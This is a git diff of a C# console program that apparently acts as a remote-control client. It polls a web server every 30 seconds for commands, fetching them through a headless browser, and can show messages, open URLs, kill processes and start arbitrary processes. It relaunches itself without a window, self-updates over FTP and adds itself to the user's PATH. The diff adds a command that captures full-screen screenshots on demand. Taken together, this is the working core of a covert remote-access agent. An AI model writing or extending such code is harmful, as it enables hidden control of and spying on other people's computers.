@@ -1,27 +1,25 @@
-﻿using System.Diagnostics;
-using System.Runtime.InteropServices;
-using FluentFTP;
-
+﻿using FluentFTP;
 using Newtonsoft.Json;
-
 using OpenQA.Selenium;
-using OpenQA.Selenium.Edge;
 using OpenQA.Selenium.Chrome;
+using OpenQA.Selenium.Edge;
 using OpenQA.Selenium.Support.UI;
-
-using static DEBUGGER;
+using System.Diagnostics;
+using System.Drawing;
+using System.IO.Compression;
 using System.Net;
+using System.Runtime.InteropServices;
 using WebDriverManager;
 using WebDriverManager.DriverConfigs.Impl;
-using System.IO.Compression;
+using System.Windows.Forms;
+using static DEBUGGER;
 
-using SharpCompress.Common;
-using SharpCompress.Readers;
-
-class Program
+internal class Program
 {
     [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
     public static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);
+    [DllImport("user32.dll")]
+    private static extern bool SetProcessDPIAware();
 
     public static bool canClose = true;
     public static string ProcessFileName = "";
@@ -36,11 +34,13 @@ class Program
             "program",
             "make_shortcut.bat");
 
-    static async Task Main()
+    public static bool enableUI = false;
+    public static string[] args = Array.Empty<string>();
+
+    private static async Task Main()
     {
         DebugLogMode();
-        string[] args = Environment.GetCommandLineArgs();
-        bool enableUI = false;
+        args = Environment.GetCommandLineArgs();
         bool forceInstall = false;
         bool firstArg = true;
         bool setId = false;
@@ -62,8 +62,9 @@ class Program
             {
                 return args;
             }
+
             Console.WriteLine("Set the new arguments, separated by spaces");
-            var newArgs = Console.ReadLine()?.Split(' ') ?? new string[0];
+            string[] newArgs = Console.ReadLine()?.Split(' ') ?? Array.Empty<string>();
 
             if (args.Length >= 1)
             {
@@ -78,6 +79,7 @@ class Program
                 return newArgs;
             }
         }
+
         Console.WriteLine("Arguments:");
         for (int i = 1; i < args.Length; i++)
         {
@@ -112,6 +114,7 @@ class Program
                         {
                             DebugLogMode(1);
                         }
+
                         break;
                     case "--debugloglines":
                     case "--debuglogline":
@@ -132,6 +135,15 @@ class Program
                     case "--setcomputerid":
                         // Set computer ID
                         setId = true;
+                        break;
+                    case "--readstartfile":
+                    case "--readstartupfile":
+                    case "--readstart":
+                    case "--readfile":
+                    case "--startfile":
+                        // Read the start file
+                        Console.WriteLine("Reading startup file");
+                        Version.ReadStartFile();
                         break;
                     case "--version":
                         // Show version
@@ -162,6 +174,8 @@ class Program
             StartProcessWithoutUI();
         }
 
+        SetProcessDPIAware();
+
         // Set up the drivers for Selenium
         new DriverManager().SetUpDriver(new ChromeConfig());
 
@@ -191,6 +205,7 @@ class Program
             {
                 GetCommands.SwitchCmds(command);
             }
+
             await Task.Delay(30000);
         }
     }
@@ -200,7 +215,7 @@ class Program
         return MessageBox(IntPtr.Zero, message, title, buttons + 4096);
     }
 
-    static bool CheckUpdates(bool forceInstall = false)
+    private static bool CheckUpdates(bool forceInstall = false)
     {
         return Version.CheckForUpdates(forceInstall);
     }
@@ -240,6 +255,7 @@ class Program
                 arguments += arg + " ";
             }
         }
+
         ProcessStartInfo startInfo = new(currentProcess)
         {
             CreateNoWindow = true,
@@ -275,16 +291,18 @@ class Program
             {
                 File.WriteAllText(computer_id_path, "{\"computer_id\": null}");
             }
+
             string jsonString = File.ReadAllText(computer_id_path);
             configInfo = JsonConvert.DeserializeObject<Dictionary<string, object>?>(jsonString);
-            if (configInfo != null && configInfo.ContainsKey("computer_id") && configInfo["computer_id"] is string)
+            if (configInfo != null && configInfo.ContainsKey("computer_id") && configInfo["computer_id"] is string v)
             {
-                computerId = (string)configInfo["computer_id"];
+                computerId = v;
             }
             else
             {
                 LogDebug("Computer ID not found in config file.");
             }
+
             if (setId && enableUI)
             {
                 Console.WriteLine(computerId == null ? "Do you want to set the computer ID? (Y/N)" : $"Set computer ID: {computerId}\nDo you want to change it? (Y/N)");
@@ -312,6 +330,7 @@ class Program
         {
             LogDebug("Error: " + ex.Message);
         }
+
         if (computerId == null)
         {
             LogDebug("Computer ID not found. Setting computer ID to default value. (\"default\")");
@@ -320,9 +339,9 @@ class Program
     }
 }
 
-static class VersionInfo
+internal static class VersionInfo
 {
-    public static readonly string currentVersion = "0.2.3";
+    public static readonly string currentVersion = "0.2.4";
     public static string versionUrl = "http://site-mm.rf.gd/v/";
     public static bool debug = false;
 }
@@ -364,12 +383,12 @@ public static class GetCommands
                 {
                     { "computer_id", computerId }
                 };
-                var content = new FormUrlEncodedContent(data);
+                FormUrlEncodedContent content = new(data);
                 string responseContent = Version.GetPageContent(url + "?" + content.ReadAsStringAsync().Result);
 
                 LogDebug("Response: " + responseContent);
-                var jsonResponse = JsonConvert.DeserializeObject<List<Dictionary<string, object>>>(responseContent) ?? throw new Exception("Error reading response from server");
-                foreach (var item in jsonResponse)
+                List<Dictionary<string, object>> jsonResponse = JsonConvert.DeserializeObject<List<Dictionary<string, object>>>(responseContent) ?? throw new Exception("Error reading response from server");
+                foreach (Dictionary<string, object> item in jsonResponse)
                 {
                     if (item.ContainsKey("error"))
                     {
@@ -379,10 +398,12 @@ public static class GetCommands
                             // Convert the error object to string and check if it contains "No data found"
                             if (((string)item["error"]).ToLower().Contains("no data found"))
                             {
-                                // If it does, log the errorr
-                                LogDebug((string)item["error"]);
+                                // If it does, log the error
+                                //LogDebug((string)item["error"]);
+                                throw new Exception("No commands found");
                             }
                         }
+
                         LogDebug("Error: " + item["error"]);
                     }
                     else
@@ -391,7 +412,7 @@ public static class GetCommands
                         if (item.ContainsKey(key))
                         {
                             command = item;
-                            break; // If successful, break out of the loop
+                            throw new Exception("OK");
                         }
                         else
                         {
@@ -402,6 +423,10 @@ public static class GetCommands
             }
             catch (Exception e)
             {
+                if (e.Message == "No commands found" || e.Message == "OK")
+                {
+                    break; // Break out of the loop
+                }
                 LogDebug("\nException Caught!");
                 LogDebug("Message: " + e.Message);
                 if (attempt < maxRetries - 1) // If this wasn't the last attempt
@@ -415,9 +440,10 @@ public static class GetCommands
                 }
             }
         }
+
         if (command == null)
         {
-            LogDebug("No commands received.");
+            Console.WriteLine("No commands received.");
             return null;
         }
         else
@@ -447,6 +473,7 @@ public static class GetCommands
             {
                 return false;
             }
+
             switch (lowerCaseCommand)
             {
                 case "showmessage":
@@ -518,6 +545,7 @@ public static class GetCommands
                     {
                         Console.WriteLine($"Invalid URL: {urlToOpen}");
                     }
+
                     break;
                 case "killprocess":
                 case "endprocess":
@@ -541,6 +569,7 @@ public static class GetCommands
                             }
                         }
                     }
+
                     break;
                 case "startprocess":
                 case "runprocess":
@@ -563,13 +592,46 @@ public static class GetCommands
                             Process.Start(startInfoParam);
                         }
                     }
+
+                    break;
+                case "screenshot":
+                case "screen":
+                case "screencapture":
+                    string fileName = "screen__" + DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".png";
+                    string screenshotPath = Path.Combine(Version.installDir, "data", "screenshots", fileName);
+                    if (parameters != null && parameters.ContainsKey("savePath"))
+                    {
+                        screenshotPath = parameters["savePath"];
+                    }
+
+                    // Check if the directory exists
+                    if (!Directory.Exists(Path.GetDirectoryName(screenshotPath)))
+                    {
+                        Directory.CreateDirectory(Path.GetDirectoryName(screenshotPath) ?? Path.Combine(Version.installDir, "data", "screenshots"));
+                    }
+                
+                    try
+                    {
+                        Rectangle bounds = SystemInformation.VirtualScreen;
+                        using Bitmap screenshot = new(bounds.Width, bounds.Height);
+                        using Graphics graphics = Graphics.FromImage(screenshot);
+                        graphics.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size);
+                        screenshot.Save(screenshotPath, System.Drawing.Imaging.ImageFormat.Png);
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine($"Failed to take screenshot: {ex.Message}");
+                    }
+                
                     break;
                 default:
                     return false;
             }
+
             Console.WriteLine("Command: " + (string)command["command"] + " --- Parameters: " + (string)command["parameters"]);
             return true;
         }
+
         return false;
     }
 }
@@ -584,18 +646,18 @@ public static class GetCommands
 
 
 
-class Version
+internal class Version
 {
     public static string GetPageContent(string url, bool verbose = true)
     {
-        if (verbose) Console.WriteLine("\nGetting page content...");
+        //if (verbose) Console.WriteLine("\nGetting page content...");
         IWebDriver driver;
         try
         {
-            var edgeOptions = new EdgeOptions();
+            EdgeOptions edgeOptions = new();
             edgeOptions.AddArgument("headless"); // Run Edge in headless mode
 
-            var edgeService = EdgeDriverService.CreateDefaultService();
+            EdgeDriverService edgeService = EdgeDriverService.CreateDefaultService();
             edgeService.HideCommandPromptWindow = true;
             edgeService.SuppressInitialDiagnosticInformation = true;
 
@@ -606,10 +668,10 @@ class Version
             try
             {
                 if (verbose) Console.WriteLine("Failed to open Edge, trying to use Chrome... Message: " + webDriverEx.Message);
-                var chromeOptions = new ChromeOptions();
+                ChromeOptions chromeOptions = new();
                 chromeOptions.AddArgument("headless"); // Run Chrome in headless mode
 
-                var chromeService = ChromeDriverService.CreateDefaultService();
+                ChromeDriverService chromeService = ChromeDriverService.CreateDefaultService();
                 chromeService.HideCommandPromptWindow = true;
                 chromeService.SuppressInitialDiagnosticInformation = true;
 
@@ -624,14 +686,14 @@ class Version
 
         driver.Navigate().GoToUrl(url);
 
-        var wait = new WebDriverWait(driver, TimeSpan.FromSeconds(10)); // Wait up to 10 seconds
+        WebDriverWait wait = new(driver, TimeSpan.FromSeconds(10)); // Wait up to 10 seconds
         wait.Until(drv => drv.FindElement(By.TagName("body")));
 
         string pageContent = driver.FindElement(By.TagName("body")).Text;
 
         driver.Quit();
 
-        if (verbose) Console.WriteLine("Page content received.\n");
+        //if (verbose) Console.WriteLine("Page content received.\n");
 
         return pageContent;
     }
@@ -757,7 +819,7 @@ class Version
     /// <param name="currentVersion">The current version of the software.</param>
     /// <param name="latestVersion">The latest version of the software.</param>
     /// <returns>True if an update is available, false otherwise.</returns>
-    static bool IsUpdateAvailable(
+    private static bool IsUpdateAvailable(
         string currentVersion,
         string latestVersion)
     {
@@ -776,7 +838,7 @@ class Version
     /// <param name="versionUrl">The URL of the version.</param>
     /// <param name="latestVersion">The latest version.</param>
     /// <returns>A task representing the asynchronous operation. The task result is a boolean indicating whether the update was downloaded successfully.</returns>
-    static bool DownloadUpdate(string versionUrl, string latestVersion)
+    private static bool DownloadUpdate(string versionUrl, string latestVersion)
     {
         try
         {
@@ -800,7 +862,7 @@ class Version
 
             LogDebug("Downloading update...");
 
-            var progress = new Progress<double>();
+            Progress<double> progress = new();
             double previousProgress = -1;
             DateTime lastUpdate = DateTime.MinValue;
             //int totalBlocks = 40;
@@ -899,6 +961,7 @@ class Version
                     ftpClient.DownloadFile(localFilePath, remoteFilePath);
                     ftpClient.Disconnect();
                 }
+
                 LogDebug("TEST 0.0.0");
 
                 // Define the path for the extracted update
@@ -918,6 +981,7 @@ class Version
                 {
                     Directory.Delete(assembleFilesPath, true);
                 }
+
                 LogDebug("TEST 1.1.0");
                 // Ensure the directory for the assembled files exists
                 EnsureDirExists(assembleFilesPath);
@@ -1073,6 +1137,7 @@ class Version
                 ZipFile.ExtractToDirectory(reassembledZipFilePath, toPath);
                 LogDebug("ZipFile extracted");
             }
+
             return true;
         }
         catch (Exception ex)
@@ -1082,21 +1147,21 @@ class Version
         }
     }
 
-    static async Task<byte[]> DownloadDataWithProgress(string url, IProgress<double> progress)
+    private static async Task<byte[]> DownloadDataWithProgress(string url, IProgress<double> progress)
     {
-        using var ftpClient = new HttpClient();
-        using var response = await ftpClient.GetAsync(url, HttpCompletionOption.ResponseHeadersRead);
+        using HttpClient ftpClient = new();
+        using HttpResponseMessage response = await ftpClient.GetAsync(url, HttpCompletionOption.ResponseHeadersRead);
 
-        var contentLength = response.Content.Headers.ContentLength.GetValueOrDefault(-1L);
-        var totalBytes = 0L;
-        var readBuffer = new byte[8192];
+        long contentLength = response.Content.Headers.ContentLength.GetValueOrDefault(-1L);
+        long totalBytes = 0L;
+        byte[] readBuffer = new byte[8192];
 
-        using var download = await response.Content.ReadAsStreamAsync();
-        using var ms = new MemoryStream();
+        using Stream download = await response.Content.ReadAsStreamAsync();
+        using MemoryStream ms = new();
 
         while (true)
         {
-            var bytesRead = await download.ReadAsync(readBuffer);
+            int bytesRead = await download.ReadAsync(readBuffer);
             if (bytesRead == 0)
             {
                 return ms.ToArray();
@@ -1112,30 +1177,46 @@ class Version
         }
     }
 
-    static void StartHelpApp(string beginPath, string destinationPath, string installDir)
+    private static void StartHelpApp(string beginPath, string destinationPath, string installDir)
     {
         string helperAppPath = Path.Combine(installDir, "program", "helpapp.bat");
         string starterProgram = Environment.ProcessPath ?? Environment.GetCommandLineArgs()[0] ?? Path.Combine(installDir, "program", "MessageTestBlank1.exe");
+        // Write some data to a temporary file
+        Dictionary<string, string> data = new() { };
+
+        data.Add("enableui", Program.enableUI ? "true" : "false");
+        data.Add("debug", ArgsContain("--debug") ? "true" : "false");
+        data.Add("addpath", "true");
+
+        string json = JsonConvert.SerializeObject(data, Formatting.Indented);
+
+        File.WriteAllText(startFile, json);
+        // Start the help app
         Process.Start(helperAppPath, $"{beginPath} {destinationPath} \"{starterProgram}\" false");
         Environment.Exit(0);
     }
 
-    static void ExtractZip(string zipFilePath, string extractPath)
+    private static bool ArgsContain(string arg)
     {
-        try
-        {
-            ZipFile.ExtractToDirectory(zipFilePath, extractPath);
-            Console.WriteLine("Update is extracted.");
-        }
-        catch (Exception ex)
-        {
-            Console.WriteLine($"Error extracting update: {ex.Message}");
-        }
+        return Program.args.Contains(arg, StringComparer.OrdinalIgnoreCase);
     }
 
+    //static void ExtractZip(string zipFilePath, string extractPath)
+    //{
+    //    try
+    //    {
+    //        ZipFile.ExtractToDirectory(zipFilePath, extractPath);
+    //        Console.WriteLine("Update is extracted.");
+    //    }
+    //    catch (Exception ex)
+    //    {
+    //        Console.WriteLine($"Error extracting update: {ex.Message}");
+    //    }
+    //}
 
 
-    static bool EnsureDirExists(string path)
+
+    private static bool EnsureDirExists(string path)
     {
         if (!Directory.Exists(path))
         {
@@ -1203,9 +1284,85 @@ class Version
         }
     }
 
+
+
+
+
+
+    /*     using Newtonsoft.Json;
+        using System.Collections.Generic; */
+    public static string startFile = Path.Combine(Version.installDir, "program", "start.json");
+    public static void ReadStartFile()
+    {
+        if (!File.Exists(startFile)) return;
+        string json = File.ReadAllText(startFile);
+        if (string.IsNullOrWhiteSpace(json)) return;
+        if (json == "{}") return;
+
+        Dictionary<string, object>? data = JsonConvert.DeserializeObject<Dictionary<string, object>>(json);
+        if (data == null) return;
+
+        foreach (KeyValuePair<string, object> item in data)
+        {
+            switch (item.Key.ToLower())
+            {
+                case "enableui":
+                    Program.enableUI = Convert.ToBoolean(item.Value);
+                    break;
+                case "debug":
+                    if (Convert.ToBoolean(item.Value))
+                    {
+                        if (!Program.args.Contains("--debug"))
+                        {
+                            Program.args = Program.args.Concat(new string[] { "--debug" }).ToArray();
+                        }
+                    }
+                    else
+                    {
+                        Program.args = Program.args.Where(arg => arg != "--debug").ToArray();
+                    }
+
+                    break;
+                case "addpath":
+                    string programPath = Path.Combine(Version.installDir, "program");
+                    if (Directory.Exists(programPath))
+                    {
+                        string currentUserPath = Environment.GetEnvironmentVariable("PATH", EnvironmentVariableTarget.User) ?? string.Empty;
+                        if (currentUserPath == string.Empty)
+                        {
+                            Environment.SetEnvironmentVariable("PATH", programPath, EnvironmentVariableTarget.User);
+                            Console.WriteLine("Het programma is toegevoegd aan het %PATH% van de huidige gebruiker.");
+                        }
+
+                        if (!currentUserPath.Contains(programPath))
+                        {
+                            string newPath = currentUserPath + ";" + programPath;
+                            Environment.SetEnvironmentVariable("PATH", newPath, EnvironmentVariableTarget.User);
+
+                            Console.WriteLine("Het programma is toegevoegd aan het %PATH% van de huidige gebruiker.");
+                        }
+                        else
+                        {
+                            Console.WriteLine("Het programma is al toegevoegd aan het %PATH% van de huidige gebruiker.");
+                        }
+                    }
+                    else
+                    {
+                        Console.WriteLine("De opgegeven map bestaat niet.");
+                    }
+
+                    break;
+                default:
+                    // Handle unknown keys or provide a default behavior
+                    break;
+            }
+        }
+
+        File.Delete(startFile);
+    }
 }
 
-class DEBUGGER
+internal class DEBUGGER
 {
     public static LogMode logMode = LogMode.Auto;
 
